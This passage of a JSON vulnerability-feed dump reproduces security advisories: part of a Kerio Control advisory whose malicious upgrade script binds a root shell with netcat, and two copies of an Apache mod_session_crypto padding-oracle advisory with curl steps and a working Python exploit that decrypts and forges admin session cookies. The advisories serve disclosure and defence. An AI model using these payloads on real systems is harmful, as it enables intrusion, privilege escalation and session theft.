check can  \nbe done again.  \n-) If the memory pointer points near a stack (highest nibble is 0xb), the  \npointer can be used to calculate the base address of a stack.  \n-) Now the attacker knows the location of a stack (all stacks are marked as  \nreadable, writeable and executable). He can now easily bypass ASLR and DEP.  \n  \n  \n8) Remote Code Execution as administrator  \nAn attacker can create a malicious upgrade image with the following  \ncommands:  \ncat upgrade.sh  \n#!/bin/bash  \nnc -lp 9999 -e /bin/bash &  \n  \ntar czf upgrade.tar.gz *  \nmv upgrade.tar.gz upgrade.img  \n  \nThe image can be uploaded in the administrative web interface.  \nThis will bind a root shell on port 9999. The complete attack can also be  \nconducted via the cross site scripting vulnerability described in this  \nadvisory (XSS in contentLoader.php). This enables an attacker to conduct  \nthe attack from the Internet to obtain a reverse shell on Kerio Control.  \n  \n  \n9) Login not protected against brute-force attacks  \nValid credentials can be obtained via a brute-force attack.  \nIt's enough to send a POST request to /internal/dologin.php with the  \nparameters kerio_username and kerio_password set. A remote attacker  \ncan detect if the credentials are correct without reading the  \nresponse (SOP would not allow to read the response). This is possible  \nbecause /internal/photo will only return a valid image if the user is  \ncurrently logged in. The attacker can load an image from this URL and  \ncheck if loading was successful to leak the information if the  \ncredentials are valid or not.  \nThe following code demonstrates this:  \n<img src=\"https://<Kerio-IP>/internal/photo\" onerror=not_logged_in();  \nonload=logged_in();></img>  \n  \n  \nVulnerable / tested versions:  \n-----------------------------  \nThe following product versions were found to be vulnerable which were the  \nlatest versions available at the time of the discovery:  \nv9.1.0 (Build 1087)  \nv9.1.1 (Build 1324)  \n  \n  \nVendor contact timeline:  \n------------------------  \n2016-08-29: Contacting vendor through website  \n(bug report: bugreports@support.kerio.com) Ticket-ID: MYW-768664  \n2016-08-31: No answer, contacting CTO of Kerio via email  \n2016-09-01: Received security contact with PGP & S/MIME certificate  \n2016-09-01: Transmission of PGP encrypted advisory to Kerio  \n2016-09-09: Received answer, Kerio confirms vulnerabilities 1,2,3,5,6,7  \nStatement to vulnerability 9:  \n\"the feature already is in the product.\"  \nStatement to vulnerabilities 4 (Webserver running with root  \nprivileges) and 8 (Remote Code Execution as administrator):  \n\"I do not consider this a vulnerability\"  \nUpdate including a fix will be available on 2016-09-20  \n2016-09-09: SEC Consult informed Kerio to re-think the decision  \nnot fixing the vulnerabilities 4, 8 and 9  \nSEC Consult highly recommends to fix all reported issues  \n2016-09-13: SEC Consult informed Kerio that the advisory will be  \nreleased on 2016-09-22  \n2016-09-20: Kerio releases patch for Kerio Control  \n2016-09-22: Coordianted release of security advisory  \n  \n  \nSolution:  \n---------  \nThe vendor has released version 9.1.3 on 20th September which, according  \nto the vendor, fixes the vulnerabilities 1,2,3,5,6,7.  \n  \nThe vendor told us the following regarding vulnerability 9:  \n\"the feature already is in the product\"  \n  \nVulnerability 4 and 8 are not considered a vulnerability by the vendor  \nand will not be fixed.  \nSEC Consult strongly recommended fixing issue 4 and 8 as well.  \n  \nThe latest version can be downloaded from here:  \nhttp://www.kerio.com/support/kerio-control  \nhttp://www.kerio.com/support/kerio-control/release-history  \n  \n  \nWorkaround:  \n-----------  \nNone  \n  \n  \nAdvisory URL:  \n-------------  \nhttps://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm  \n  \n  \n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  \n  \nSEC Consult Vulnerability Lab  \n  \nSEC Consult  \nBangkok - Berlin - Linz - Montreal - Moscow  \nSingapore - Vienna (HQ) - Vilnius - Zurich  \n  \nAbout SEC Consult Vulnerability Lab  \nThe SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It  \nensures the continued knowledge gain of SEC Consult in the field of network  \nand application security to stay ahead of the attacker. The SEC Consult  \nVulnerability Lab supports high-quality penetration testing and the evaluation  \nof new offensive and defensive technologies for our customers. Hence our  \ncustomers obtain the most current information about vulnerabilities and valid  \nrecommendation about the risk profile of new technologies.  \n  \n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  \nInterested to work with the experts of SEC Consult?  \nSend us your application https://www.sec-consult.com/en/Career.htm  \n  \nInterested in improving your cyber security with the experts of SEC Consult?  \nContact our local offices https://www.sec-consult.com/en/About/Contact.htm  \n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  \n  \nMail: research at sec-consult dot com  \nWeb: https://www.sec-consult.com  \nBlog: http://blog.sec-consult.com  \nTwitter: https://twitter.com/sec_consult  \n  \nEOF R. Freingruber / @2016  \n  \n`\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:138812"
        }
    ],
    "CVE-2016-0736": [
        {
            "bulletinFamily": "exploit",
            "description": "Apache mod_session_crypto versions 2.3 through 2.5 suffer form a padding oracle vulnerability.",
            "modified": "2016-12-23T00:00:00",
            "published": "2016-12-23T00:00:00",
            "href": "https://0day.today/exploit/description/26574",
            "id": "1337DAY-ID-26574",
            "type": "zdt",
            "title": "Apache mod_session_crypto - Padding Oracle Vulnerability",
            "sourceData": "Padding Oracle in Apache mod_session_crypto\r\n\r\nDuring a penetration test, RedTeam Pentesting discovered a Padding\r\nOracle vulnerability in mod_session_crypto of the Apache web server.\r\nThis vulnerability can be exploited to decrypt the session data and even\r\nencrypt attacker-specified data.\r\n\r\n\r\nDetails\r\n=======\r\n\r\nProduct: Apache HTTP Server mod_session_crypto\r\nAffected Versions: 2.3 to 2.5\r\nFixed Versions: 2.4.25\r\nVulnerability Type: Padding Oracle\r\nSecurity Risk: high\r\nVendor URL: https://httpd.apache.org/docs/trunk/mod/mod_session_crypto.html\r\nVendor Status: fixed version released\r\nAdvisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2016-001.txt\r\nAdvisory Status: published\r\nCVE: CVE-2016-0736\r\nCVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0736\r\n\r\n\r\nIntroduction\r\n============\r\n\r\nThe module mod_session_crypto of the Apache HTTP Server can be used in\r\nconjunction with the modules mod_session and mod_session_cookie to store\r\nsession data in an encrypted cookie within the users' browsers. This\r\navoids server-side session state so that incoming HTTP requests can be\r\neasily distributed amongst a number of application web servers which do\r\nnot need to share session state.\r\n\r\n\r\nMore Details\r\n============\r\n\r\nThe module mod_session_crypto uses symmetric cryptography to encrypt and\r\ndecrypt session data and uses mod_session to store the encrypted data in\r\na cookie (usually called \"session\") within the user's browser. The\r\ndecrypted session is then made available to the application in an\r\nenvironment variable (in case of a CGI script) or in a custom HTTP\r\nrequest header. The application can add a custom HTTP response header\r\n(usually \"X-Replace-Session\") which instructs the HTTP server to replace\r\nthe session's content with the value of the header. Detailed\r\ninstructions to set up mod_session and mod_session_crypto can be found\r\nin the documentation:\r\nhttps://httpd.apache.org/docs/2.4/mod/mod_session.html#basicexamples\r\n\r\nThe module mod_session_crypto is configured to use either 3DES or AES\r\nwith various key sizes, defaulting to AES256. Encryption is handled by\r\nthe function \"encrypt_string\":\r\n\r\nmodules/session/mod_session_crypto.c\r\n------------------------------------------------------------------------\r\n/**\r\n * Encrypt the string given as per the current config.\r\n *\r\n * Returns APR_SUCCESS if successful.\r\n */\r\nstatic apr_status_t encrypt_string(request_rec * r, const apr_crypto_t *f,\r\n        session_crypto_dir_conf *dconf, const char *in, char **out)\r\n{\r\n[...]\r\n    apr_crypto_key_t *key = NULL;\r\n[...]\r\n    const unsigned char *iv = NULL;\r\n[...]\r\n\r\n    /* use a uuid as a salt value, and prepend it to our result */\r\n    apr_uuid_get(&salt);\r\n\r\n[...]\r\n\r\n    res = apr_crypto_passphrase(&key, &ivSize, passphrase,\r\n            strlen(passphrase),\r\n            (unsigned char *) (&salt), sizeof(apr_uuid_t),\r\n            *cipher, APR_MODE_CBC, 1, 4096, f, r->pool);\r\n\r\n[...]\r\n\r\n    res = apr_crypto_block_encrypt_init(&block, &iv, key, &blockSize, r->pool);\r\n[...]\r\n    res = apr_crypto_block_encrypt(&encrypt, &encryptlen, (unsigned char *)in,\r\n            strlen(in), block);\r\n[...]\r\n    res = apr_crypto_block_encrypt_finish(encrypt + encryptlen, &tlen, block);\r\n[...]\r\n\r\n    /* prepend the salt and the iv to the result */\r\n    combined = apr_palloc(r->pool, ivSize + encryptlen + sizeof(apr_uuid_t));\r\n    memcpy(combined, &salt, sizeof(apr_uuid_t));\r\n    memcpy(combined + sizeof(apr_uuid_t), iv, ivSize);\r\n    memcpy(combined + sizeof(apr_uuid_t) + ivSize, encrypt, encryptlen);\r\n\r\n    /* base64 encode the result */\r\n    base64 = apr_palloc(r->pool, apr_base64_encode_len(ivSize + encryptlen +\r\n                    sizeof(apr_uuid_t) + 1)\r\n            * sizeof(char));\r\n[...]\r\n    return res;\r\n}\r\n------------------------------------------------------------------------\r\n\r\nThe source code shows that an encryption key is derived from the\r\nconfigured password and a randomly chosen salt by calling the function\r\n\"apr_crypto_passphrase\". This function internally uses PBKDF2 to derive\r\nthe key. The data is then encrypted and the salt and IV prepended to the\r\nencrypted data. Before returning to the caller, the result is encoded as\r\nbase64.\r\n\r\nThis procedure does not guarantee integrity of the ciphertext, so the\r\nApache module is unable to detect whether a session sent back to the\r\nserver has been tampered with. Depending on the application this often\r\nmeans that attackers are able to exploit a Padding Oracle vulnerability.\r\nThis allows decrypting the session and encrypting arbitrary data chosen\r\nby the attacker.\r\n\r\n\r\nProof of Concept\r\n================\r\n\r\nThe vulnerability can be reproduced as follows. First, the modules\r\nmod_session, mod_session_crypto and mod_session_cookie are enabled and\r\nconfigured:\r\n\r\n------------------------------------------------------------------------\r\nSession On\r\nSessionEnv On\r\nSessionCookieName session path=/\r\nSessionHeader X-Replace-Session\r\nSessionCryptoPassphrase RedTeam\r\n------------------------------------------------------------------------\r\n\r\nIn addition, CGI scripts are enabled for a folder and the following CGI\r\nscript is saved as \"status.rb\" and is made available to clients:\r\n\r\n------------------------------------------------------------------------\r\n#!/usr/bin/env ruby\r\n\r\nrequire 'cgi'\r\n\r\ncgi = CGI.new\r\ndata = CGI.parse(ENV['HTTP_SESSION'])\r\n\r\nif data.has_key? 'username'\r\n        puts\r\n        puts \"your username is %s\" % data['username']\r\n        exit\r\nend\r\n\r\nputs \"X-Replace-Session: username=guest&timestamp=\" + Time.now.strftime(\"%s\")\r\nputs\r\nputs \"not logged in\"\r\n------------------------------------------------------------------------\r\n\r\nOnce the CGI script is correctly set up, the command-line HTTP client curl\r\ncan be used to access it:\r\n\r\n------------------------------------------------------------------------\r\n$ curl -i http://127.0.0.1:8080/cgi-bin/status.rb\r\nHTTP/1.1 200 OK\r\nDate: Tue, 19 Jan 2016 13:23:19 GMT\r\nServer: Apache/2.4.10 (Ubuntu)\r\nSet-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ\r\n   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/\r\nCache-Control: no-cache\r\nSet-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ\r\n   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-ruby\r\n\r\nnot logged in\r\n------------------------------------------------------------------------\r\n\r\nThe example shows that a new encrypted cookie with the name \"session\" is\r\nreturned, and the response body contains the text \"not logged in\".\r\nCalling the script again with the cookie just returned reveals that the\r\nusername in the session is set to \"guest\":\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\\\r\nLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU= \\\r\nhttp://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nyour username is guest\r\n------------------------------------------------------------------------\r\n\r\nSending a modified cookie ending in \"u=\" instead of \"U=\" will invalidate\r\nthe padding at the end of the ciphertext, so the session cannot be\r\ndecrypted correctly and is therefore not passed to the CGI script, which\r\nreturns the text \"not logged in\" again:\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\\\r\nLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRu= \\\r\nhttp://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nnot logged in\r\n------------------------------------------------------------------------\r\n\r\nThis verifies the existence of the Padding Oracle vulnerability. The\r\nPython library[1] python-paddingoracle was then used to implement\r\ndecrypting the session by exploiting the Padding Oracle vulnerability.\r\n\r\nexploit.py\r\n------------------------------------------------------------------------\r\nfrom paddingoracle import BadPaddingException, PaddingOracle\r\nfrom base64 import b64encode, b64decode\r\nimport requests\r\n\r\nclass PadBuster(PaddingOracle):\r\n    def __init__(self, valid_cookie, **kwargs):\r\n        super(PadBuster, self).__init__(**kwargs)\r\n        self.wait = kwargs.get('wait', 2.0)\r\n        self.valid_cookie = valid_cookie\r\n\r\n    def oracle(self, data, **kwargs):\r\n        v = b64encode(self.valid_cookie+data)\r\n\r\n        response = requests.get('http://127.0.0.1:8080/cgi-bin/status.rb',\r\n                cookies=dict(session=v), stream=False, timeout=5, verify=False)\r\n\r\n        if 'username' in response.content:\r\n            logging.debug('No padding exception raised on %r', v)\r\n            return\r\n\r\n        raise BadPaddingException\r\n\r\nif __name__ == '__main__':\r\n    import logging\r\n    import sys\r\n\r\n    if not sys.argv[2:]:\r\n        print 'Usage: [encrypt|decrypt] <session value> <plaintext>'\r\n        sys.exit(1)\r\n\r\n    logging.basicConfig(level=logging.WARN)\r\n    mode = sys.argv[1]\r\n    session = b64decode(sys.argv[2])\r\n    padbuster = PadBuster(session)\r\n\r\n    if mode == \"decrypt\":\r\n        cookie = padbuster.decrypt(session[32:], block_size=16, iv=session[16:32])\r\n        print('Decrypted session:\\n%r' % cookie)\r\n    elif mode == \"encrypt\":\r\n        key = session[0:16]\r\n        plaintext = sys.argv[3]\r\n\r\n        s = padbuster.encrypt(plaintext, block_size=16)\r\n\r\n        data = b64encode(key+s[0:len(s)-16])\r\n        print('Encrypted session:\\n%s' % data)\r\n    else:\r\n        print \"invalid mode\"\r\n        sys.exit(1)\r\n------------------------------------------------------------------------\r\n\r\nThis Python script can then be used to decrypt the session:\r\n\r\n------------------------------------------------------------------------\r\n$ time python exploit.py decrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\\\r\nHztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=\r\nDecrypted session:\r\nb'username=guest&timestamp=1453282205\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r'\r\n\r\nreal    6m43.088s\r\nuser    0m15.464s\r\nsys 0m0.976s\r\n------------------------------------------------------------------------\r\n\r\nIn this sample application, the username and a timestamp are included in\r\nthe session data. The Python script can also be used to encrypt a new\r\nsession containing the username \"admin\":\r\n\r\n------------------------------------------------------------------------\r\n$ time python exploit.py encrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\\\r\nHztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYB\\\r\nRU= username=admin\r\n\r\nEncrypted session:\r\nsxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7zmQ/GLFjF4pcXY\r\n\r\nreal3m38.002s\r\nusers0m8.536s\r\nsys0m0.512s\r\n\r\n------------------------------------------------------------------------\r\n\r\nSending this newly encrypted session to the server shows that the\r\nusername is now \"admin\":\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7\\\r\nzmQ/GLFjF4pcXY http://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nyour username is admin\r\n------------------------------------------------------------------------\r\n\r\n\r\nWorkaround\r\n==========\r\n\r\nUse a different means to store the session, e.g. in a database by using\r\nmod_session_dbd.\r\n\r\n\r\nFix\r\n===\r\n\r\nUpdate to Apache HTTP version 2.4.25 (see [2]).\r\n\r\n\r\nSecurity Risk\r\n=============\r\n\r\nApplications which use mod_session_crypto usually store sensitive values\r\nin the session and rely on an attacker's inability to decrypt or modify\r\nthe session. Successful exploitation of the Padding Oracle vulnerability\r\nsubverts this mechanism and allows to construct sessions with arbitrary\r\nattacker-specified content. Depending on the application this may\r\ncompletely subvert the application's security. Therefore, this\r\nvulnerability poses a high risk.\r\n\r\n\r\nTimeline\r\n========\r\n\r\n2016-01-11 Vulnerability identified\r\n2016-01-12 Customer approved disclosure to vendor\r\n2016-01-12 CVE number requested\r\n2016-01-20 Vendor notified\r\n2016-01-22 Vendor confirmed the vulnerability\r\n2016-02-03 Vendor provided patch\r\n2016-02-04 Apache Security Team assigned CVE number\r\n2016-03-03 Requested status update from vendor, no response\r\n2016-05-02 Requested status update from vendor, no response\r\n2016-07-14 Requested status update and roadmap from vendor\r\n2016-07-21 Vendor confirms working on a new released and inquired whether the\r\n           patch fixes the vulnerability\r\n2016-07-22 RedTeam confirms\r\n2016-08-24 Requested status update from vendor\r\n2016-08-29 Vendor states that there is no concrete timeline\r\n2016-12-05 Vendor announces a release\r\n2016-12-20 Vendor released fixed version\r\n2016-12-23 Advisory released\r\n\r\n\r\nReferences\r\n==========\r\n\r\n[1] https://github.com/mwielgoszewski/python-paddingoracle\r\n[2] http://httpd.apache.org/security/vulnerabilities_24.html\n\n#  0day.today [2018-03-19]  #",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/zdt/1337DAY-ID-26574"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2016-12-23T00:00:00",
            "published": "2016-12-23T00:00:00",
            "href": "https://packetstormsecurity.com/files/140265/Apache-mod_session_crypt-2.5-Padding-Oracle.html",
            "id": "PACKETSTORM:140265",
            "title": "Apache mod_session_crypt 2.5 Padding Oracle",
            "type": "packetstorm",
            "sourceData": "`Advisory: Padding Oracle in Apache mod_session_crypto  \n  \nDuring a penetration test, RedTeam Pentesting discovered a Padding  \nOracle vulnerability in mod_session_crypto of the Apache web server.  \nThis vulnerability can be exploited to decrypt the session data and even  \nencrypt attacker-specified data.  \n  \n  \nDetails  \n=======  \n  \nProduct: Apache HTTP Server mod_session_crypto  \nAffected Versions: 2.3 to 2.5  \nFixed Versions: 2.4.25  \nVulnerability Type: Padding Oracle  \nSecurity Risk: high  \nVendor URL: https://httpd.apache.org/docs/trunk/mod/mod_session_crypto.html  \nVendor Status: fixed version released  \nAdvisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2016-001.txt  \nAdvisory Status: published  \nCVE: CVE-2016-0736  \nCVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0736  \n  \n  \nIntroduction  \n============  \n  \nThe module mod_session_crypto of the Apache HTTP Server can be used in  \nconjunction with the modules mod_session and mod_session_cookie to store  \nsession data in an encrypted cookie within the users' browsers. This  \navoids server-side session state so that incoming HTTP requests can be  \neasily distributed amongst a number of application web servers which do  \nnot need to share session state.  \n  \n  \nMore Details  \n============  \n  \nThe module mod_session_crypto uses symmetric cryptography to encrypt and  \ndecrypt session data and uses mod_session to store the encrypted data in  \na cookie (usually called \"session\") within the user's browser. The  \ndecrypted session is then made available to the application in an  \nenvironment variable (in case of a CGI script) or in a custom HTTP  \nrequest header. The application can add a custom HTTP response header  \n(usually \"X-Replace-Session\") which instructs the HTTP server to replace  \nthe session's content with the value of the header. Detailed  \ninstructions to set up mod_session and mod_session_crypto can be found  \nin the documentation:  \nhttps://httpd.apache.org/docs/2.4/mod/mod_session.html#basicexamples  \n  \nThe module mod_session_crypto is configured to use either 3DES or AES  \nwith various key sizes, defaulting to AES256. Encryption is handled by  \nthe function \"encrypt_string\":  \n  \nmodules/session/mod_session_crypto.c  \n------------------------------------------------------------------------  \n/**  \n* Encrypt the string given as per the current config.  \n*  \n* Returns APR_SUCCESS if successful.  \n*/  \nstatic apr_status_t encrypt_string(request_rec * r, const apr_crypto_t *f,  \nsession_crypto_dir_conf *dconf, const char *in, char **out)  \n{  \n[...]  \napr_crypto_key_t *key = NULL;  \n[...]  \nconst unsigned char *iv = NULL;  \n[...]  \n  \n/* use a uuid as a salt value, and prepend it to our result */  \napr_uuid_get(&salt);  \n  \n[...]  \n  \nres = apr_crypto_passphrase(&key, &ivSize, passphrase,  \nstrlen(passphrase),  \n(unsigned char *) (&salt), sizeof(apr_uuid_t),  \n*cipher, APR_MODE_CBC, 1, 4096, f, r->pool);  \n  \n[...]  \n  \nres = apr_crypto_block_encrypt_init(&block, &iv, key, &blockSize, r->pool);  \n[...]  \nres = apr_crypto_block_encrypt(&encrypt, &encryptlen, (unsigned char *)in,  \nstrlen(in), block);  \n[...]  \nres = apr_crypto_block_encrypt_finish(encrypt + encryptlen, &tlen, block);  \n[...]  \n  \n/* prepend the salt and the iv to the result */  \ncombined = apr_palloc(r->pool, ivSize + encryptlen + sizeof(apr_uuid_t));  \nmemcpy(combined, &salt, sizeof(apr_uuid_t));  \nmemcpy(combined + sizeof(apr_uuid_t), iv, ivSize);  \nmemcpy(combined + sizeof(apr_uuid_t) + ivSize, encrypt, encryptlen);  \n  \n/* base64 encode the result */  \nbase64 = apr_palloc(r->pool, apr_base64_encode_len(ivSize + encryptlen +  \nsizeof(apr_uuid_t) + 1)  \n* sizeof(char));  \n[...]  \nreturn res;  \n}  \n------------------------------------------------------------------------  \n  \nThe source code shows that an encryption key is derived from the  \nconfigured password and a randomly chosen salt by calling the function  \n\"apr_crypto_passphrase\". This function internally uses PBKDF2 to derive  \nthe key. The data is then encrypted and the salt and IV prepended to the  \nencrypted data. Before returning to the caller, the result is encoded as  \nbase64.  \n  \nThis procedure does not guarantee integrity of the ciphertext, so the  \nApache module is unable to detect whether a session sent back to the  \nserver has been tampered with. Depending on the application this often  \nmeans that attackers are able to exploit a Padding Oracle vulnerability.  \nThis allows decrypting the session and encrypting arbitrary data chosen  \nby the attacker.  \n  \n  \nProof of Concept  \n================  \n  \nThe vulnerability can be reproduced as follows. First, the modules  \nmod_session, mod_session_crypto and mod_session_cookie are enabled and  \nconfigured:  \n  \n------------------------------------------------------------------------  \nSession On  \nSessionEnv On  \nSessionCookieName session path=/  \nSessionHeader X-Replace-Session  \nSessionCryptoPassphrase RedTeam  \n------------------------------------------------------------------------  \n  \nIn addition, CGI scripts are enabled for a folder and the following CGI  \nscript is saved as \"status.rb\" and is made available to clients:  \n  \n------------------------------------------------------------------------  \n#!/usr/bin/env ruby  \n  \nrequire 'cgi'  \n  \ncgi = CGI.new  \ndata = CGI.parse(ENV['HTTP_SESSION'])  \n  \nif data.has_key? 'username'  \nputs  \nputs \"your username is %s\" % data['username']  \nexit  \nend  \n  \nputs \"X-Replace-Session: username=guest&timestamp=\" + Time.now.strftime(\"%s\")  \nputs  \nputs \"not logged in\"  \n------------------------------------------------------------------------  \n  \nOnce the CGI script is correctly set up, the command-line HTTP client curl  \ncan be used to access it:  \n  \n------------------------------------------------------------------------  \n$ curl -i http://127.0.0.1:8080/cgi-bin/status.rb  \nHTTP/1.1 200 OK  \nDate: Tue, 19 Jan 2016 13:23:19 GMT  \nServer: Apache/2.4.10 (Ubuntu)  \nSet-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ  \nl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/  \nCache-Control: no-cache  \nSet-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ  \nl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/  \nTransfer-Encoding: chunked  \nContent-Type: application/x-ruby  \n  \nnot logged in  \n------------------------------------------------------------------------  \n  \nThe example shows that a new encrypted cookie with the name \"session\" is  \nreturned, and the response body contains the text \"not logged in\".  \nCalling the script again with the cookie just returned reveals that the  \nusername in the session is set to \"guest\":  \n  \n------------------------------------------------------------------------  \n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\\  \nLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU= \\  \nhttp://127.0.0.1:8080/cgi-bin/status.rb  \n  \nyour username is guest  \n------------------------------------------------------------------------  \n  \nSending a modified cookie ending in \"u=\" instead of \"U=\" will invalidate  \nthe padding at the end of the ciphertext, so the session cannot be  \ndecrypted correctly and is therefore not passed to the CGI script, which  \nreturns the text \"not logged in\" again:  \n  \n------------------------------------------------------------------------  \n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\\  \nLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRu= \\  \nhttp://127.0.0.1:8080/cgi-bin/status.rb  \n  \nnot logged in  \n------------------------------------------------------------------------  \n  \nThis verifies the existence of the Padding Oracle vulnerability. The  \nPython library[1] python-paddingoracle was then used to implement  \ndecrypting the session by exploiting the Padding Oracle vulnerability.  \n  \nexploit.py  \n------------------------------------------------------------------------  \nfrom paddingoracle import BadPaddingException, PaddingOracle  \nfrom base64 import b64encode, b64decode  \nimport requests  \n  \nclass PadBuster(PaddingOracle):  \ndef __init__(self, valid_cookie, **kwargs):  \nsuper(PadBuster, self).__init__(**kwargs)  \nself.wait = kwargs.get('wait', 2.0)  \nself.valid_cookie = valid_cookie  \n  \ndef oracle(self, data, **kwargs):  \nv = b64encode(self.valid_cookie+data)  \n  \nresponse = requests.get('http://127.0.0.1:8080/cgi-bin/status.rb',  \ncookies=dict(session=v), stream=False, timeout=5, verify=False)  \n  \nif 'username' in response.content:  \nlogging.debug('No padding exception raised on %r', v)  \nreturn  \n  \nraise BadPaddingException  \n  \nif __name__ == '__main__':  \nimport logging  \nimport sys  \n  \nif not sys.argv[2:]:  \nprint 'Usage: [encrypt|decrypt] <session value> <plaintext>'  \nsys.exit(1)  \n  \nlogging.basicConfig(level=logging.WARN)  \nmode = sys.argv[1]  \nsession = b64decode(sys.argv[2])  \npadbuster = PadBuster(session)  \n  \nif mode == \"decrypt\":  \ncookie = padbuster.decrypt(session[32:], block_size=16, iv=session[16:32])  \nprint('Decrypted session:\\n%r' % cookie)  \nelif mode == \"encrypt\":  \nkey = session[0:16]  \nplaintext = sys.argv[3]  \n  \ns = padbuster.encrypt(plaintext, block_size=16)  \n  \ndata = b64encode(key+s[0:len(s)-16])  \nprint('Encrypted session:\\n%s' % data)  \nelse:  \nprint \"invalid mode\"  \nsys.exit(1)  \n------------------------------------------------------------------------  \n  \nThis Python script can then be used to decrypt the session:  \n  \n------------------------------------------------------------------------  \n$ time python exploit.py decrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\\  \nHztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=  \nDecrypted session:  \nb'username=guest&timestamp=1453282205\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r'  \n  \nreal 6m43.088s  \nuser 0m15.464s  \nsys 0m0.976s  \n------------------------------------------------------------------------  \n  \nIn this sample application, the username and a timestamp are included in  \nthe session data. The Python script can also be used to encrypt a new  \nsession containing the username \"admin\":  \n  \n------------------------------------------------------------------------  \n$ time python exploit.py encrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\\  \nHztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYB\\  \nRU= username=admin  \n  \nEncrypted session:  \nsxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7zmQ/GLFjF4pcXY  \n  \nreal3m38.002s  \nusers0m8.536s  \nsys0m0.512s  \n  \n------------------------------------------------------------------------  \n  \nSending this newly encrypted session to the server shows that the  \nusername is now \"admin\":  \n  \n------------------------------------------------------------------------  \n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7\\  \nzmQ/GLFjF4pcXY http://127.0.0.1:8080/cgi-bin/status.rb  \n  \nyour username is admin  \n------------------------------------------------------------------------  \n  \n  \nWorkaround  \n==========  \n  \nUse a different means to store the session, e.g. in a database by using  \nmod_session_dbd.  \n  \n  \nFix  \n===  \n  \nUpdate to Apache HTTP version 2.4.25 (see [2]).  \n  \n  \nSecurity Risk  \n=============  \n  \nApplications which use mod_session_crypto usually store sensitive values  \nin the session and rely on an attacker's inability to decrypt or modify  \nthe session. Successful exploitation of the Padding Oracle vulnerability  \nsubverts this mechanism and allows to construct sessions with arbitrary  \nattacker-specified content. Depending on the application this may  \ncompletely subvert the application's security. Therefore, this  \nvulnerability poses a high risk.  \n  \n  \nTimeline  \n========  \n  \n2016-01-11 Vulnerability identified  \n2016-01-12 Customer approved disclosure to vendor  \n2016-01-12 CVE 